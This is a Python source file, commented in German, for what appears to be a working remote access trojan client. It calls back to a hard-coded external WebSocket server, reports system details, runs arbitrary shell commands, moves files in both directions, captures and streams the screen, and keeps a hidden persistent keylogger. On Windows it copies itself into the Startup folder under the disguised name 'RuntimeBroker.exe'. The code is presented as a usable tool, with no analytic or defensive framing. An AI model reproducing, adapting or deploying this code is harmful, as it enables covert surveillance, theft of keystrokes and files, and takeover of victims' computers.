import asyncio
import websockets
import json
import subprocess
import os
import base64
import mss
import mss.tools
from PIL import Image
import io
import platform
import shutil
import sys
import socket
import urllib.request
import logging
import secrets
import time
from datetime import datetime

# --- Konfiguration & Globals ---
SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app/rat")
KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
HEARTBEAT_INTERVAL = 45  # Sekunden

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# --- Optionales Modul: Keylogger ---
try:
    from pynput import keyboard
except ImportError:
    logging.warning("pynput ist nicht installiert. Keylogger-Funktion ist deaktiviert.")
    keyboard = None

# === Hilfsfunktionen: System & Netzwerk ===
def get_public_ip() -> str:
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
            return resp.read().decode('utf8')
    except Exception as e:
        logging.warning(f"Fehler beim Abrufen der öffentlichen IP: {e}")
        return "Unbekannt"

def get_initial_info() -> dict:
    """Sammelt alle initialen Systeminformationen in einem strukturierten Format."""
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
        
    return {
        "type": "info",
        "data": {
            "user": user,
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "ip": get_public_ip(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "cwd": os.getcwd(),
        }
    }

def get_detailed_system_info() -> str:
    """Sammelt detaillierte Systeminformationen für den 'systeminfo'-Befehl."""
    try:
        info = get_initial_info()["data"]
        # Füge zusätzliche Details hinzu
        info["Lokale IPs"] = ", ".join(socket.gethostbyname_ex(info["hostname"])[2])
        info["CPU"] = platform.processor()
        
        if hasattr(os, 'sysconf'):
            ram_mb = round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**2), 2)
            info["Arbeitsspeicher (MB)"] = ram_mb
        
        free_space = shutil.disk_usage('.').free / (1024 * 1024)
        info["Freier Speicherplatz (MB)"] = round(free_space, 2)
        
        return "\n".join(f"{k.replace('_', ' ').title()}: {v}" for k, v in info.items())
    except Exception as e:
        return f"Fehler beim Abrufen der Systeminformationen: {e}"

def ensure_persistence():
    """Stellt Persistenz unter Windows sicher."""
    if platform.system() != "Windows":
        return
    try:
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        dest_path = os.path.join(startup_folder, "RuntimeBroker.exe")
        
        if sys.executable.lower() == dest_path.lower():
            return
            
        if not os.path.exists(dest_path):
            os.makedirs(startup_folder, exist_ok=True)
            shutil.copyfile(sys.executable, dest_path)
            logging.info(f"Persistenz in {dest_path} sichergestellt.")
    except Exception as e:
        logging.warning(f"Fehler bei Persistenz: {e}")

# === Datei- und Verzeichnisfunktionen ===
def list_directory(path=".") -> str:
    try:
        entries = os.listdir(path)
        output = [f"Inhalt von {os.path.abspath(path)}:"]
        for entry in sorted(entries):
            full_path = os.path.join(path, entry)
            prefix = "[DIR] " if os.path.isdir(full_path) else "      "
            output.append(f"{prefix} {entry}")
        return "\n".join(output)
    except Exception as e:
        return f"Fehler beim Auflisten des Verzeichnisses: {e}"

def change_directory(path: str) -> str:
    try:
        os.chdir(path)
        with open(CD_STATE_FILE, "w", encoding="utf-8") as f:
            f.write(os.getcwd())
        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
    except Exception as e:
        return f"Fehler beim Wechseln des Verzeichnisses: {e}"

def load_cwd_state():
    """Lädt das letzte Arbeitsverzeichnis beim Start."""
    try:
        if os.path.exists(CD_STATE_FILE):
            with open(CD_STATE_FILE, "r", encoding="utf-8") as f:
                path = f.read().strip()
            if os.path.isdir(path):
                os.chdir(path)
    except Exception as e:
        logging.warning(f"Konnte Arbeitsverzeichnis nicht wiederherstellen: {e}")

# === Keylogger ===
def on_press_persistent(key):
    if not keyboard: return
    
    special_key_map = { keyboard.Key.enter: "\n", keyboard.Key.space: " ", keyboard.Key.backspace: "[BS]" }
    log_entry = special_key_map.get(key)
    if log_entry is None:
        try: log_entry = key.char
        except AttributeError: log_entry = f"[{key.name}]"

    if log_entry:
        try:
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f: f.write(log_entry)
        except Exception: pass

def start_persistent_keylogger():
    if not keyboard: return
    header = f"\n--- SESSION GESTARTET: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    try:
        with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f: f.write(header)
        listener = keyboard.Listener(on_press=on_press_persistent)
        listener.daemon = True
        listener.start()
        logging.info(f"Persistenter Keylogger gestartet. Log: {KEYLOG_FILE_PATH}")
    except Exception as e:
        logging.error(f"Fehler beim Starten des Keyloggers: {e}")

# === Screen Streaming ===
class ScreenStreamer:
    def __init__(self):
        self._task = None
        self._running = False
        self._ws = None

    async def start(self, ws):
        if self._running: return
        self._running = True
        self._ws = ws
        self._task = asyncio.create_task(self._stream())
        logging.info("Screen-Streaming gestartet.")

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            self._task = None
        logging.info("Screen-Streaming gestoppt.")

    async def _stream(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while self._running:
                try:
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((1280, 720), Image.LANCZOS)
                    
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=75)
                    img_base64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                    
                    await self._ws.send(json.dumps({"type": "screen_frame", "data": img_base64}))
                    await asyncio.sleep(0.1)
                except (websockets.ConnectionClosed, asyncio.CancelledError): break
                except Exception as e:
                    logging.error(f"Fehler im Screen-Stream: {e}")
                    break
        logging.info("Screen-Stream-Schleife beendet.")

screen_streamer = ScreenStreamer()

# === Hauptlogik: Befehlsverarbeitung ===
async def process_commands(websocket: websockets.WebSocketClientProtocol):
    async for message in websocket:
        try:
            if isinstance(message, bytes): continue

            command = json.loads(message)
            action = command.get("action")
            response = {"type": "command_output", "status": "ok"}
            output = None

            if action == "exec":
                result = subprocess.run(command.get("command"), shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
                output = result.stdout + result.stderr
            elif action == "screenshot":
                with mss.mss() as sct:
                    sct_img = sct.grab(sct.monitors[1])
                    img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
            elif action == "download":
                path = command.get("path")
                if os.path.isfile(path):
                    with open(path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
                else: output = "Fehler: Datei nicht gefunden."
            elif action == "upload":
                with open(command.get("filename"), "wb") as f:
                    f.write(base64.b64decode(command.get("data")))
                output = f"Datei gespeichert: {command.get('filename')}"
            elif action == "ls": output = list_directory(command.get("path", "."))
            elif action == "cd": output = change_directory(command.get("path", "."))
            elif action == "systeminfo": output = get_detailed_system_info()
            elif action == "keylogger":
                if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                    output = "Keylogger nicht verfügbar oder keine Daten."
                else:
                    with open(KEYLOG_FILE_PATH, "rb") as f:
                        f.seek(0, os.SEEK_END)
                        filesize = f.tell()
                        count = command.get("count", 1000)
                        f.seek(max(0, filesize - count))
                        output = f.read().decode("utf-8", errors="ignore")
            elif action == "screenstream_start":
                await screen_streamer.start(websocket)
                output = "Screen-Streaming gestartet."
            elif action == "screenstream_stop":
                await screen_streamer.stop()
                output = "Screen-Streaming gestoppt."
            else: output = f"Unbekannte Aktion: {action}"

            if output: response["output"] = output
            await websocket.send(json.dumps(response))
        except Exception as e:
            logging.error(f"Fehler bei Befehlsverarbeitung: {e}")

# --- Heartbeat & Hauptverbindung ---
async def heartbeat(ws: websockets.WebSocketClientProtocol):
    while True:
        try:
            await ws.send(json.dumps({"type": "ping"}))
            await asyncio.sleep(HEARTBEAT_INTERVAL)
        except websockets.ConnectionClosed:
            break

async def connect_to_server():
    ensure_persistence()
    load_cwd_state()
    start_persistent_keylogger()
    
    backoff_time = 5
    while True:
        try:
            async with websockets.connect(SERVER_URI) as websocket:
                logging.info(f"Verbunden mit Server: {SERVER_URI}")
                backoff_time = 5

                await websocket.send(json.dumps(get_initial_info()))

                heartbeat_task = asyncio.create_task(heartbeat(websocket))
                commands_task = asyncio.create_task(process_commands(websocket))
                
                done, pending = await asyncio.wait([heartbeat_task, commands_task], return_when=asyncio.FIRST_COMPLETED)
                for task in pending: task.cancel()

        except (websockets.ConnectionClosed, ConnectionRefusedError, socket.gaierror) as e:
            logging.warning(f"Verbindung verloren ({type(e).__name__}). Nächster Versuch in {backoff_time}s.")
        except Exception as e:
            logging.error(f"Unerwarteter Fehler: {e}")
        
        await asyncio.sleep(backoff_time)
        backoff_time = min(backoff_time * 2, 300)

if __name__ == "__main__":
    try:
        asyncio.run(connect_to_server())
    except KeyboardInterrupt:
        logging.info("Client manuell beendet.")
